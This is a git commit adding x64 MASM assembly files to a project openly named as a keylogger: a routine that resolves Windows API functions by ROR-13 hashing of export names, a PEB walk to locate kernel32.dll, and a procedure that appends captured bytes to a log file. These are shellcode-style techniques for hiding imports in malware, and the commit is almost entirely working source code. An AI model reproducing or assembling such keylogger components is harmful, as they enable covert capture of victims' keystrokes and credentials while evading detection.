2c3d5901ab2901904e18b2b73241ff0630c765e1
AntonioCampus <antoniocampus276@gmail.com>
2022-08-02 09:29:00 +0200

    Source code

---
+++ x64_masm_keylog/api_finder.asm
@@ -0,0 +1,93 @@
+
+EXTERN strLen  : PROC
+EXTERN CalcHash: PROC
+.code
+; ---------------------------------------------------;
+; This procedure return the address of any function. ;
+; from the adddress of the library 				     ;
+; first  param : address of the library				 ;
+; second param : the hash to resolve				 ;
+; ---------------------------------------------------;
+
+HashResolver PROC
+	push rbp							; +8B into the stack (don't forget 16 bit stack alignment)
+	mov rbp,rsp							; rbp is the frame pointer (it's not mandatory in 64 bit mode)
+	sub rsp,64							; +48B (+32 for local variable (5), stack already aligned to 16)
+	mov qword ptr[rbp+10h],rcx			; save the first argument into  the first shadow space slot, address of the library
+	mov qword ptr[rbp+18h],rdx			; save the second argument into the second shadow space slot, hash to resolve
+	mov qword ptr[rbp-8], 0			    ; var1: number of functions
+	mov qword ptr[rbp-16],0				; var2: addOfnames
+	mov qword ptr[rbp-24],0				; var3: addOfnamesOrd
+	mov qword ptr[rbp-32],0				; var4: addOfFunc
+	mov qword ptr[rbp-40],0				; var5: i (index)
+	xor rax,rax							; rax = 0
+	xor rbx,rbx							; rbx = 0
+	xor rcx,rcx							; rcx = 0
+	mov rbx,qword ptr[rbp+10h]			; rbx = k32 address
+	; parsing the library headers in order to find the export table structure
+	mov eax, dword ptr [rbx+3ch]		; e_lfanew (offset to pe signature,32 bit value)
+	add rax,rbx							; absolute value of the ntheader address
+	mov ecx, dword ptr[rax+88h]			; rva of the export table
+	add rcx,rbx							; absolute address of the export table
+	xor rax,rax							; rax = 0
+	mov eax,dword ptr[rcx+14h]			; number of functions
+	mov qword ptr[rbp-8],rax			; save to the stack
+	xor rax,rax							; rax = 0
+	mov eax,dword ptr[rcx+1ch]			; rva of addOfFunc
+	add rax,rbx							; absolute address of add of function
+	mov qword ptr[rbp-32], rax			; save to te stack
+	xor rax,rax							; rax = 0
+	mov eax,dword ptr[rcx+20h]			; rva of addOfnames
+	add rax,rbx							; absolute address of addrOfnames
+	mov qword ptr[rbp-16], rax			; save to te stack
+	xor rax,rax							; rax = 0
+	mov eax,dword ptr[rcx+24h]			; rva of addOfnamesOrd
+	add rax,rbx							; absolute address of addOfnamesOrd
+	mov qword ptr[rbp-24], rax			; save to te stack
+ciclo:
+	; parsing the string of the names
+	xor rax,rax							; rax = 0
+	xor rbx,rbx							; rbx = 0
+	xor rcx,rcx							; rcx = 0
+	xor rdx,rdx							; rdx = 0
+	xor rdi,rdi							; rdi = 0
+	xor rsi,rsi							; rsi = 0
+	mov rsi,4							; rsi = 4
+	mov rdi,qword ptr[rbp-40]			; rdi = i
+	mov rdx,qword ptr[rbp-8]			; rdx = number of functions
+	cmp rdi, rdx						; compare i with number of function (size)
+	je fine								; if i < size ? compute, else exit
+	mov rax,qword ptr[rbp-16]			; rax = addOfname
+	mov ecx,dword ptr[rax+(rdi*4)]		; rax = *(DWORD32*)(addOfname + (i *4));
+	add rcx,qword ptr[rbp+10h]			; make the rva address become absolute by adding k32addres
+	call strLen							; address is already in rcx, now i'll calculate the string lenght
+	mov rdx,rax							; the size of the string as the second argument, the rcx already set-up
+	call CalcHash						; calulate the hash
+	cmp rax,qword ptr[rbp+18h]			; compare just the two hash
+	je hash_match						; hash found
+	xor rdi,rdi							; rdi=0
+	mov rdi,qword ptr[rbp-40]			; rdi=i
+	inc rdi								; i++
+	mov qword ptr[rbp-40],rdi			; save 
+	jmp ciclo							; looping
+hash_match:
+	; now i'ill get tha ordinal value from addOfnamesOrd
+	xor rax,rax							; rax = 0
+	xor rbx,rbx							; rbx = 0
+	xor rcx,rcx							; rcx = 0
+	xor r9,r9							; r9  = 0
+	mov rax, qword ptr[rbp-40]			; rax = i
+	mov rbx, qword ptr[rbp-24]			; rbx = addOfnamesOrd
+	mov cx,word ptr[rbx+(rax*2)]		; get ordinal value *(ULONG*)(addOfnamesOrd+i*2)
+	; by using the ordinal value i'll get the address of the function
+	mov rbx,qword ptr[rbp-32]			; rbx = addOfFunc
+	mov eax, dword ptr[rbx + rcx*4]		;*(DWORD32*)addOfFunc+(ordinalValue*4)
+	add rax,qword ptr[rbp+10h]			; absolute value of the function
+fine:
+	leave
+	ret
+
+HashResolver ENDP
+
+end
+
---
+++ x64_masm_keylog/util.asm
@@ -0,0 +1,150 @@
+
+EXTERN createfile  : QWORD
+EXTERN writefile   : QWORD
+EXTERN closehandle : QWORD
+
+
+.data
+	FILE_APPEND_DATA		EQU 00000004h
+	FILE_SHARE_READ			EQU 00000001h
+	OPEN_ALWAYS				EQU 00000004h
+	FILE_ATTRIBUTE_NORMAL	EQU 00000080h
+	INVALID_HANDLE_VALUE    EQU 0FFFFFFFFh
+
+
+
+.code
+; ---------------------------------------------------;
+;   This procedure write data to file									
+;	first param : byte to be written
+;	second param: filepath
+; ---------------------------------------------------;
+
+writeTofile PROC
+	push rbp										; +8 B into the stack (don't forget 16 bit stack alignment)
+	mov rbp,rsp										; rbp is the frame pointer (it's not mandatory in 64 bit mode)  	
+	mov qword ptr[rbp+10h],rcx						; save argument in the first slote of the shadow space
+	mov qword ptr[rbp+18h],rdx			            ; save the second argument into the second shadow space slot, filename
+	sub rsp,80										; space needed for calling a function with max 7 argument (56) + 1 local var (8) +allign(8)
+	mov qword ptr[rbp-8], 0							; hfile variable
+	;-----------------------------------;
+	; create file						;
+	;-----------------------------------;
+	mov qword ptr[rsp+30h], 0						; seventh argument (third of the stack)
+	mov dword ptr[rsp+28h], FILE_ATTRIBUTE_NORMAL	; sixth argument (second of the stack)
+	mov dword ptr[rsp+20h], OPEN_ALWAYS				; fifth argument (first of the stack)
+	xor r9,r9										; fourth argument
+	mov r8, FILE_SHARE_READ							; third argument
+	mov rdx,FILE_APPEND_DATA						; second argument
+	mov rcx,qword ptr[rbp+18h]						; first argument, filename					
+	call createfile								    ; call api function
+	cmp rax,INVALID_HANDLE_VALUE					; check if return value is equal 0xffffffffff		
+	je fine											; exit 
+	;-----------------------------------;
+	; write file						;
+	;-----------------------------------;
+	mov qword ptr[rbp-8],rax						; save hfile 
+	mov qword ptr[rsp+20h], 0						; lpOverlapped
+	mov r9,0										; lpNumberOfBytesWritten
+	mov r8,1										; nNumberOfBytesToWrite
+	lea rdx, [rbp+10h]								; lpBuffer
+	mov rcx,qword ptr[rbp-8]						; hFile
+	call writefile									; call api function
+	;-----------------------------------;
+	; close handle 						;
+	;-----------------------------------;
+	mov rcx,qword ptr[rbp-8]						; file to close
+	call closehandle								; call api function			
+	fine:
+	leave
+	ret
+writeTofile ENDP
+
+
+; ---------------------------------------------------;
+; This procedure calculate the string lenght         ;
+; first argument address of the string				 ;
+; ---------------------------------------------------;
+strLen PROC
+	push rbp
+	mov rbp,rsp
+	sub rsp,8
+	xor r8,r8
+	xor r9,r9
+ciclo:
+	mov r8b, byte ptr[rcx+r9]
+	cmp r8b,0h
+	je fine
+	inc r9
+	jmp ciclo
+fine:
+	mov rax,r9 
+	leave
+	ret
+
+strLen ENDP
+
+
+
+; ---------------------------------------------------;
+; This procedure return the address of kernel32.dll  ;
+; The code supposes that the library has been		 ;
+; loaded as third as often happend, but i'am going	 ; 
+; to code a more flexible version of this			 ;
+; ---------------------------------------------------;
+FindK32Addr PROC
+	push rbp							; +8B into the stack (don't forget 16 bit stack alignment)
+	mov rbp,rsp							; rbp is the frame pointer (it's not mandatory in 64 bit mode)
+	sub rsp,8							; +8 to allign the stack to 16
+	mov rdx, gs:[60h]					; Get a pointer to the PEB
+	mov rdx, [rdx+18h]				    ; Get PEB->Ldr
+	mov rdx, [rdx+20h]					; get entry InMemoryOrder module list
+	mov rdx,[rdx]						; get first module
+	mov rdx,[rdx]						; get second module
+	mov rax,[rdx+30h-16]				; -16B because in each entry the are flink and blink address 8+8=16B
+fine:
+	leave
+	ret
+FindK32Addr ENDP
+
+; ---------------------------------------------------;
+; This procedure calculate the ror hash of a string. ;
+; param1: string									 ;
+; param2: size of the string						 ;
+; ---------------------------------------------------;
+CalcHash PROC
+	xor rsi,rsi
+	push rbp							; +8B into the stack (don't forget 16 bit stack alignment)
+	mov rbp,rsp							; rbp is the frame pointer (it's not mandatory in 64 bit mode)
+	sub rsp,24							; +24B (16 for local variable (2), +8 to allign the stack to 16, total 24+8=32)
+	mov qword ptr[rbp+16],rcx			; save the first argument into first shadow space slot, string pointer (str)
+	mov qword ptr[rbp+24],rdx			; save the second argument into the second space slot, string size
+	mov qword ptr[rbp-8], 0			    ; var1: hash=0		
+	mov qword ptr[rbp-16],0				; var2: i=0
+ciclo:
+	;--------------------------------------------------------------------------;
+	mov rsi, qword ptr[rbp-16]          ; var2=rsi = i
+	mov rdi,qword ptr[rbp+24]			; second argument, size
+	cmp rsi,rdi							; compare counter i with size
+	je fine								; if i < size repeat, if not exit
+	;--------------------------------------------------------------------------;	
+	xor rcx,rcx							; rcx = 0
+	xor rax,rax							; rax = 0
+	mov rbx, qword ptr[rbp+16]         ; rbx = string address
+	mov cl, byte ptr[rbx+rsi]			; bl = string[i]
+	mov rax, qword ptr[rbp-8]			; rax = hash
+	ror eax, 13							; rax = hash = ror(hash,13)
+	add rax,rcx							; hash += string[i]
+	mov qword ptr[rbp-8],rax			; save hash into memory
+	;--------------------------------------------------------------------------;
+	inc rsi								; i++
+	mov qword ptr[rbp-16], rsi			; save new i state
+	jmp ciclo
+	;---------------------------------------------------------------------------;
+fine:
+	mov rax, qword ptr[rbp-8]
+	leave
+	ret
+calchash ENDP
+end
+
